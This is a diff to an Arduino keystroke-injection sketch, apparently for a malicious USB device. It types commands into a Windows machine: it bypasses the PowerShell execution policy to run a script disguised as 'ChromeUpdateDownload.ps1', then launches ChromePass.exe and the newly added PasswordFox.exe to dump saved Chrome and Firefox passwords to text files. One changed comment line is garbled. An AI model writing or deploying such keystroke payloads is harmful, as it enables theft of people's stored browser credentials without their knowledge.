@@ -36,10 +36,13 @@ void setup() {
   Keyboard.print("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
   typeKey(KEY_RETURN);
   delay(100);
-  Keyboard.print("ChromePass.exe /stext maintenance.txt");
+  Keyboard.print("ChromePass.exe /stext ChromePass.txt");
   typeKey(KEY_RETURN);
   delay(1000);
-  Keyboard.print("powershell ./maintenance.ps1");
+  Keyboard.print("PasswordFox.exe /stext PasswordFox.txt");
+  typeKey(KEY_RETURN);
+  delay(1000);
+  /*Keyboard.print("powershell ./maintenance.ps1");
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("cd C:/");
@@ -49,9 +52,9 @@ void setup() {
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("exit");
-  typeKey(KEY_RETURN);
+  typeKey(KEY_RETURN);*/
 
-  // Ending stream
+  // Ending streampdateDownload.pps1
   Keyboard.end();
 }
 
